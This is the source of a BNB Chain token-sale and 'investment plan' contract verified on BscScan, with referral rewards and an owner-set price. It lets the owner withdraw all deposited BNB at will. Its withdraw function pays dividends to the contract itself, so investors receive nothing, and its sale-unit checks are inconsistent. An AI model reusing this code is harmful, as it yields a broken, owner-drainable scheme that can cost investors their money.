/**
 *Submitted for verification at BscScan.com on 2021-07-12
*/

pragma solidity 0.5.4;
//  token == 0xCF1AeCc287027f797b99650B1E020fFa0fb0e248

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
   
contract cryptros  {
     using SafeMath for uint256;
     
       struct Investment 
       {
        uint256 investmentDate;
        uint256 investmentDur;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
        }
    
    struct User 
    {
        uint id;
        address referrer;
        uint partnersCount;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        bool isFreeUser;
    }



	uint256 private constant INTEREST_CYCLE = 30 days;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    
    uint256  freeToken= 1000*1e18;

    uint public lastUserId = 2;
    uint public refPercent=10;
    
    uint256 public dailyInterest=40;
    
    uint public buyPercent=10;
    uint public sellPercent=5;
    
    uint public token_price = 116*1e10;
    
    uint public  total_token_buy = 0;
	uint public  total_token_sale = 0;
	
	uint public  MINIMUM_BUY = 50*1e18;
	uint public  MINIMUM_SALE = 50*1e18;
	
    uint public  MAXIMUM_BUY = 600*1e18;
	uint public  MAXIMUM_SALE = 600*1e18;
	
	
    address public owner;
    
    mapping(uint8 => uint) public levelPrice;

  
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event TokenPriceHistory(uint  previous, uint indexed inc_desc, uint new_price, uint8 type_of);
    event TokenDistribution(address indexed sender, address indexed receiver, uint total_token, uint live_rate);
    event onWithdraw(address  _user, uint256 withdrawalAmount);
    
   //For Token Transfer
   
   IBEP20 private cryptrosToken; 
   event onBuy(address buyer , uint256 amount);
   mapping(address => uint256) public boughtOf;

    constructor(address ownerAddress,IBEP20 _cryptrosToken) public 
    {
        owner = ownerAddress;
        
        cryptrosToken = _cryptrosToken;
        
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0),
            planCount: uint(0),
            isFreeUser:false
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
         
    }
    
    function() external payable 
    {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

   

    function withdrawBalance(uint256 amt) public 
    {
        require(msg.sender == owner, "onlyOwner");
        msg.sender.transfer(amt);
    }


    function registrationExt(address referrerAddress) external payable 
    {
        registration(msg.sender, referrerAddress);
    }
    
   
    function registration(address userAddress, address referrerAddress) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0,
            planCount: 0,
            isFreeUser:true
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        lastUserId++;
        users[referrerAddress].partnersCount++;
        if(freeToken>0)
        {
            cryptrosToken.transfer(msg.sender,freeToken);
            cryptrosToken.transfer(referrerAddress,(freeToken*refPercent)/100);
        }

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
  
    
     function usersInvestment(address userAddress, uint8 plan) public view returns(uint256,uint256,uint256,uint256,bool) {
        return (
        users[userAddress].plans[plan].investmentDate,
        users[userAddress].plans[plan].investment,
        users[userAddress].plans[plan].lastWithdrawalDate,
        users[userAddress].plans[plan].currentDividends,
        users[userAddress].plans[plan].isExpired
                );
    }
	
 
    
    function isUserExists(address user) public view returns (bool) 
    {
        return (users[user].id != 0);
    }

	function buyToken(uint tokenQty,address _referrer) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     if(!isUserExists(msg.sender))
	     {
	       registration(msg.sender, _referrer);  
	     }
	     require(isUserExists(msg.sender), "user not exists");
	     require(tokenQty>=MINIMUM_BUY,"Invalid minimum quatity");
	     require(tokenQty<=MAXIMUM_BUY,"Invalid maximum quatity");	            
	     uint buy_amt=(((tokenQty/1e18)+((tokenQty/1e18)*buyPercent)/100)*(token_price));
	     require(msg.value>=buy_amt,"Invalid buy amount");
		 cryptrosToken.transfer(msg.sender , (tokenQty));
		 if(msg.sender!=owner)
		 cryptrosToken.transfer(users[msg.sender].referrer , (((tokenQty*refPercent)/100)));
		 emit TokenDistribution(address(this), msg.sender, tokenQty, token_price);					
	 }
	 
	function sellToken(uint tokenQty) public payable 
	{
	    address userAddress=msg.sender;
	    require(cryptrosToken.balanceOf(userAddress)>=(tokenQty*1e18),"Low Balance");
	    require(cryptrosToken.allowance(userAddress,address(this))>=(tokenQty*1e18),"Approve your token First");
	    require(!isContract(userAddress),"Can not be contract");
        require(isUserExists(userAddress), "user is not exists. Register first.");
	    require(tokenQty>=MINIMUM_SALE,"Invalid minimum quatity");
	    require(tokenQty<=MAXIMUM_SALE,"Invalid maximum quatity");
	     
	    uint trx_amt=((tokenQty-(tokenQty*sellPercent)/1000)*(token_price));
	    
		cryptrosToken.transferFrom(userAddress ,address(this), (tokenQty*1e18));
		address(uint160(msg.sender)).transfer(trx_amt);
		emit TokenDistribution(userAddress,address(this), tokenQty*1e18, token_price);
		total_token_sale=total_token_sale+tokenQty;
	 }
	
    function isContract(address _address) public view returns (bool _isContract)
    {
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }     
	 
	
	function _invest(address _addr,uint256 _amount,uint256 _duration) private 
    {
        require(_duration >0, "Wrong Duration");
        uint256 uid = users[_addr].id;
        require(uid>0,"Register First.");
        uint256 planCount = users[_addr].planCount;
       
        users[_addr].plans[planCount].investmentDate = block.timestamp;
        users[_addr].plans[planCount].investmentDur = 30*60*60*24*_duration;
        users[_addr].plans[planCount].lastWithdrawalDate = block.timestamp;
        users[_addr].plans[planCount].investment = _amount;
        users[_addr].plans[planCount].currentDividends = 0;
        users[_addr].plans[planCount].isExpired = false;
        users[_addr].planCount = users[_addr].planCount.add(1);
    }
	
	
   	function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }
            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
          
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(users[msg.sender].plans[i].investmentDur);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
           

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment ,dailyInterest, withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , dailyInterest);

            withdrawalAmount += amount;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].currentDividends += amount;
        }
        
        cryptrosToken.transfer(address(this),(withdrawalAmount));

        emit onWithdraw(msg.sender, withdrawalAmount);
    }
	
	
	function getInvestmentPlanByUID(address _user) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) {
       
        User storage investor = users[_user];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investmentDur = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investmentDur[i]=investor.plans[i].investmentDur;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
            } else {
                isExpireds[i] = false;
               
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investor.plans[i].investmentDur)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, dailyInterest, investor.plans[i].investmentDate.add(investor.plans[i].investmentDur), investor.plans[i].lastWithdrawalDate, dailyInterest);
                        isExpireds[i] = true;
                        interests[i] = dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, dailyInterest);
                       interests[i] = dailyInterest;
                    }
                
            }
        }

        return
        (
        investmentDates,
        investmentDur,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

	function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24*30);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24*30);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24*30);
        }

    }
    
    function freeTokens(uint256 _token) public
    {
        require(msg.sender==owner,"Only Owner");
        freeToken=_token*1e18;
    }
    
    
    function referral(uint256 _percent) public
    {
        require(msg.sender==owner,"Only Owner");
        refPercent=_percent;
    }
 
    
        
        
    function token_setting(uint min_buy, uint max_buy, uint min_sale, uint max_sale, uint price) public payable
    {
           require(msg.sender==owner,"Only Owner");
              MINIMUM_BUY = min_buy;
    	      MINIMUM_SALE = min_sale;
              MAXIMUM_BUY = max_buy;
              MAXIMUM_SALE = max_sale; 
              if(price>0)
              {
                token_price=price;
              }
        }
   
        
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}